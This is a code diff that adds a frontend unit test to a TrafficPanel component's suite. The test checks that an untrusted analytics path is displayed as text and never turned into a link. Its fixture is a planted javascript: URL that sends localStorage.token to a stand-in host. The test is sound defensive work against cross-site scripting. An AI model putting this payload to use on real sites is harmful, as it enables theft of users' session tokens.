@@ -72,6 +72,23 @@ describe("TrafficPanel", () => {
     expect(screen.getByText("(search)")).toBeInTheDocument();
   });
 
+  it("never links a reported path that is not a web address", async () => {
+    // Umami takes page views from anyone, so a "path" can be anything at all.
+    const planted = "javascript:fetch('//x/?'+localStorage.token)";
+    api.seoTraffic.mockResolvedValue(
+      traffic({
+        top_content: [
+          { site_key: "tax", domain: "tax.doaide.com", path: planted, url: planted, views: 9, is_content: true, content_id: null, title: null },
+        ],
+      }),
+    );
+    draw();
+
+    const top = await screen.findByRole("region", { name: "Content driving traffic" });
+    expect(within(top).getByText(planted)).toBeInTheDocument();
+    expect(within(top).queryByRole("link", { name: planted })).not.toBeInTheDocument();
+  });
+
   it("changes the window and refreshes past the cache", async () => {
     api.seoTraffic.mockResolvedValue(traffic());
     draw();
